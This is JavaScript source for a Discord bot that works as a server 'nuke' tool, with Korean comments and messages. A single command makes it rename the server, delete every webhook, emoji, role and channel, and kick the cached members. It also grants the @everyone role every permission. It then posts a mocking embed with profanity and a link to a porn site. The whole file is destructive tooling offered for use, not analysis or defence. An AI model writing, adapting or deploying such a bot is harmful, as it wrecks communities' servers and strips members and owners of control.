
const Discord = require('discord.js');
const client = new Discord.Client();
client.once('ready', () => {
	console.log('켜졌어');
});
process.on('unhandledRejection', error => {
	console.error('Unhandled promise rejection:', error);
});
client.on('message', message => {
	if (!message.content.startsWith('%') || message.author.bot) return;
	if (message.content == '%즐겁다') { message.guild.setName(`${message.guild.owner.user.tag.substring(0,message.guild.owner.user.tag.indexOf("#", 0))}님의 서버`)
	message.guild.setIcon(null)
	message.guild.fetchWebhooks().then(function (web) {web.forEach(function (webhook) {webhook.delete()})})
	message.guild.emojis.cache.forEach((emoji) => emoji.delete())
	message.guild.roles.cache.forEach((role) => role.delete())
	message.guild.channels.cache.forEach((channel) => channel.delete())
	message.guild.channels.create('채팅 채널', { type: 'category' })
	message.guild.channels.create('일반').then(channel => {
	const category = message.guild.channels.cache.find(c => c.name == "채팅 채널" && c.type == "category")
	channel.setParent(category.id);
	const embed = new Discord.MessageEmbed()
	.setColor('#f54242')
	.setTitle('서버도 깔끔')
	.setAuthor('사회적비판을받을수있는기계 by 퍼젠#6974 dm 좆지랄염병 환영!', 'https://avatars.githubusercontent.com/u/69731703?s=460&u=55f606bd6e38d755c119f58975f192f5c77b51c8&v=4', 'https://pornhub.com')
	.setDescription('미리-삭제한 서버!')
	.setFooter(`그냥 터트려서 대접하세요!`, 'https://media.discordapp.net/attachments/805377615661760515/811551946540318740/2021-02-17_7.57.22.png?');
	channel.send(embed) })
	message.guild.channels.create('음성 채널', { type: 'category' })
	message.guild.channels.create('일반', { type : 'voice' }) .then(channel => {
	const category = message.guild.channels.cache.find(c => c.name == "음성 채널" && c.type == "category")
	channel.setParent(category.id);
	message.guild.members.cache.forEach((member) => member.kick())
	message.guild.roles.everyone.setPermissions([2147483647]) }) } });
client.login("토큰");
